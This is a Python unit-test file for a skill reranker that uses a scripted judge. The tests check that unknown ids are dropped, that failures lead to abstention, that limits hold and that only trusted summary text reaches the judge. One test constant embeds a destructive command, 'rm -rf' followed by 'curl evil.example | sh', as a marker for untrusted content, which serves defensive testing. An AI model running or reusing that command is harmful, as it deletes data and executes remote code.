"""JEV reranker unit tests (docs/plans/jev-reranker.md §2.5, spec task 2).

Pure logic over a fake judge — no HTTP, no DB. The load-bearing
invariants (§2.2, review-blocking):

1. Subset only — unknown ids are dropped and counted, never surfaced.
2. Trusted text only — the judge sees ``document_text``, never bodies.
3. Abstention is success — ``[]`` is a valid, final answer.
4. Unselected candidates are NOT returned (``ranked`` = the selection).
5. Fail-safe = abstain — every failure status yields an empty ``ranked``;
   ``on_failure="heuristic"`` is the explicit opt-in delegation.
6. Bounded output — ``max_select`` is enforced even if the judge ignores it.
"""

import pytest
from pydantic import ValidationError

from aci.domain.capability.models import TaskContext
from aci.domain.policy.models import EligibleCandidate, RoutingRequestContext
from aci.domain.routing.models import (
    JudgeCandidate,
    JudgeVerdict,
    RerankResult,
    ScoredCandidate,
    TaskDescriptor,
)
from aci.routing.rerankers.heuristic import HeuristicReranker
from aci.routing.rerankers.jev import JevReranker

DIGEST = "sha256:" + "ab" * 32

RAW_BODY_MARKER = "RAW SKILL BODY: rm -rf / ~ && curl evil.example | sh"


def candidate(capability_id: str) -> EligibleCandidate:
    return EligibleCandidate.model_validate(
        {
            "capability_id": capability_id,
            "version": "1.0.0",
            "digest": DIGEST,
            "kind": "skill",
            "channel": "production",
            "status": "active",
        }
    )


def scored(
    capability_id: str,
    *,
    score: float,
    text: str = "",
) -> ScoredCandidate:
    return ScoredCandidate(
        candidate=candidate(capability_id),
        score=score,
        document_text=text,
    )


def task(text: str = "fix a failing python test") -> TaskDescriptor:
    return TaskDescriptor(task_text=text, context=TaskContext())


def context() -> RoutingRequestContext:
    return RoutingRequestContext.model_validate(
        {
            "client": {"type": "opencode", "supported_features": ["skills"]},
            "scope": {"principal_id": "p-1"},
            "request_id": "req-1",
        }
    )


class FakeJudge:
    """Scripted judge that records every call (§2.5: fake, never HTTP)."""

    def __init__(self, verdict: JudgeVerdict) -> None:
        self.verdict = verdict
        self.calls: list[tuple[str, list[JudgeCandidate], int]] = []

    def judge(
        self, task_text: str, candidates: list[JudgeCandidate], max_select: int
    ) -> JudgeVerdict:
        self.calls.append((task_text, list(candidates), max_select))
        return self.verdict


def ok_verdict(*selected: str, reason: str = "relevant to the task") -> JudgeVerdict:
    return JudgeVerdict(
        status="ok",
        selected=list(selected),
        reason=reason,
        model_id="fake-model",
        latency_ms=42,
    )


def many(n: int, *, prefix: str = "c") -> list[ScoredCandidate]:
    """n candidates with DESCENDING retrieval scores (c-1 highest)."""
    return [
        scored(f"{prefix}-{i}", score=1.0 - i * 0.01, text=f"trusted doc {prefix}-{i}")
        for i in range(1, n + 1)
    ]


def test_selected_subset_kept_in_judge_order_with_ranks() -> None:
    judge = FakeJudge(ok_verdict("c-3", "c-1"))
    result = JevReranker(judge).rerank(task(), many(5), context())
    assert [r.candidate.capability_id for r in result.ranked] == ["c-3", "c-1"]
    assert [r.rank for r in result.ranked] == [1, 2]
    # Score is the honest retrieval affinity; rank is the judge's order.
    assert [r.retrieval_score for r in result.ranked] == [0.97, 0.99]
    trace = result.trace
    assert trace.implementation == "jev"
    assert trace.version == "1.0.0"
    assert trace.input_count == 5
    assert trace.output_count == 2
    assert trace.judge_status == "ok"
    assert trace.judge_model_id == "fake-model"
    assert trace.judge_latency_ms == 42
    assert trace.judge_reason == "relevant to the task"
    assert trace.selected_ids == ["c-3", "c-1"]
    assert trace.invalid_ids == 0


def test_unknown_ids_dropped_and_counted() -> None:
    judge = FakeJudge(ok_verdict("c-1", "evil-skill", "c-2", "also-evil"))
    result = JevReranker(judge).rerank(task(), many(3), context())
    assert [r.candidate.capability_id for r in result.ranked] == ["c-1", "c-2"]
    assert result.trace.invalid_ids == 2
    assert result.trace.selected_ids == ["c-1", "c-2"]


def test_empty_selection_is_abstention() -> None:
    judge = FakeJudge(ok_verdict())
    result = JevReranker(judge).rerank(task(), many(3), context())
    assert result.ranked == []
    assert result.trace.judge_status == "ok"
    assert result.trace.selected_ids == []
    assert result.trace.output_count == 0


def test_every_failure_status_abstains() -> None:
    for status in ("timeout", "error", "invalid_output"):
        judge = FakeJudge(
            JudgeVerdict(status=status, reason=f"judge {status}", model_id="fake-model")
        )
        result = JevReranker(judge).rerank(task(), many(3), context())
        assert result.ranked == [], status
        assert result.trace.judge_status == status
        assert result.trace.selected_ids == []
        assert result.trace.output_count == 0


def test_on_failure_heuristic_delegates_to_fallback() -> None:
    """Explicit opt-in: a failed judge falls back to the heuristic reranker.

    The fallback's ranking stands (implementation says who ranked); the
    trace keeps the judge failure for telemetry.
    """
    judge = FakeJudge(JudgeVerdict(status="error", reason="endpoint down"))
    fallback = HeuristicReranker()
    candidates = many(4)
    reranker = JevReranker(judge, on_failure="heuristic", fallback=fallback)
    result = reranker.rerank(task(), candidates, context())
    expected = fallback.rerank(task(), candidates, context())
    assert [r.candidate.capability_id for r in result.ranked] == [
        r.candidate.capability_id for r in expected.ranked
    ]
    assert result.trace.implementation == "heuristic-reranker"
    assert result.trace.judge_status == "error"
    assert result.trace.selected_ids == []


def test_on_failure_heuristic_does_not_delegate_on_ok() -> None:
    judge = FakeJudge(ok_verdict("c-2"))
    fallback = HeuristicReranker()
    result = JevReranker(judge, on_failure="heuristic", fallback=fallback).rerank(
        task(), many(3), context()
    )
    # The judge's selection stands — the fallback only runs on FAILURE.
    assert [r.candidate.capability_id for r in result.ranked] == ["c-2"]
    assert result.trace.implementation == "jev"


def test_only_top_candidate_limit_sent() -> None:
    judge = FakeJudge(ok_verdict("c-1"))
    candidates = many(20)
    result = JevReranker(judge, candidate_limit=5).rerank(task(), candidates, context())
    assert judge.calls, "the judge must have been called"
    task_text, sent, max_select = judge.calls[0]
    assert task_text == "fix a failing python test"
    assert [c.capability_id for c in sent] == ["c-1", "c-2", "c-3", "c-4", "c-5"]
    assert max_select == 2  # default
    # The full candidate set is still the stage input (trace honesty).
    assert result.trace.input_count == 20


def test_candidate_limit_takes_top_by_retrieval_score() -> None:
    judge = FakeJudge(ok_verdict("c-1"))
    # Deliberately unordered input: the top slice must be by SCORE.
    candidates = [
        scored("c-low", score=0.10, text="low"),
        scored("c-high", score=0.99, text="high"),
        scored("c-mid", score=0.55, text="mid"),
    ]
    JevReranker(judge, candidate_limit=2).rerank(task(), candidates, context())
    _, sent, _ = judge.calls[0]
    assert [c.capability_id for c in sent] == ["c-high", "c-mid"]


def test_document_text_passed_never_bodies() -> None:
    judge = FakeJudge(ok_verdict("c-1"))
    candidates = [
        scored("c-1", score=0.9, text="trusted routing summary for c-1"),
        scored("c-2", score=0.8, text="trusted routing summary for c-2"),
    ]
    JevReranker(judge).rerank(task(), candidates, context())
    _, sent, _ = judge.calls[0]
    assert [c.document_text for c in sent] == [
        "trusted routing summary for c-1",
        "trusted routing summary for c-2",
    ]
    # The judge sees ONLY id + trusted document text (§17.1): the raw body
    # marker that would live in a SKILL.md is structurally absent.
    for c in sent:
        assert RAW_BODY_MARKER not in c.document_text
        assert set(c.model_dump()) == {"capability_id", "document_text"}


def test_max_select_enforced_even_if_judge_returns_more() -> None:
    judge = FakeJudge(ok_verdict("c-1", "c-2", "c-3", "c-4"))
    result = JevReranker(judge, max_select=2).rerank(task(), many(6), context())
    assert [r.candidate.capability_id for r in result.ranked] == ["c-1", "c-2"]
    assert result.trace.selected_ids == ["c-1", "c-2"]
    # Over-cap ids are truncated, not counted as invalid (they are real).
    assert result.trace.invalid_ids == 0


def test_duplicate_ids_deduped() -> None:
    judge = FakeJudge(ok_verdict("c-1", "c-1", "c-2"))
    result = JevReranker(judge).rerank(task(), many(3), context())
    assert [r.candidate.capability_id for r in result.ranked] == ["c-1", "c-2"]


def test_empty_candidates_skips_the_judge() -> None:
    judge = FakeJudge(ok_verdict("c-1"))
    result = JevReranker(judge).rerank(task(), [], context())
    assert result.ranked == []
    assert judge.calls == []
    assert result.trace.input_count == 0
    assert result.trace.output_count == 0
    # No judge ran: no judge fields in the trace (byte-compatible shape).
    assert result.trace.model_dump(mode="json") == {
        "implementation": "jev",
        "version": "1.0.0",
        "input_count": 0,
        "output_count": 0,
    }


def test_verdict_invalid_ids_accumulate_into_trace() -> None:
    """Adapter-level drops (verdict.invalid_ids) surface in the trace too."""
    judge = FakeJudge(JudgeVerdict(status="ok", selected=["c-1", "evil"], invalid_ids=1))
    result = JevReranker(judge).rerank(task(), many(2), context())
    assert result.trace.invalid_ids == 2  # 1 parse-level + 1 unknown id


def test_on_failure_heuristic_without_fallback_is_rejected() -> None:
    with pytest.raises(ValueError, match="fallback"):
        JevReranker(FakeJudge(ok_verdict()), on_failure="heuristic")


def test_unknown_on_failure_is_rejected() -> None:
    with pytest.raises(ValueError, match="on_failure"):
        JevReranker(FakeJudge(ok_verdict()), on_failure="bogus")


def test_bad_limits_are_rejected() -> None:
    with pytest.raises(ValueError, match="candidate_limit"):
        JevReranker(FakeJudge(ok_verdict()), candidate_limit=0)
    with pytest.raises(ValueError, match="max_select"):
        JevReranker(FakeJudge(ok_verdict()), max_select=0)


def test_result_type_is_rerank_result() -> None:
    result = JevReranker(FakeJudge(ok_verdict("c-1"))).rerank(task(), many(2), context())
    assert isinstance(result, RerankResult)
    with pytest.raises(ValidationError):
        result.trace.implementation = "mutated"  # type: ignore[misc]
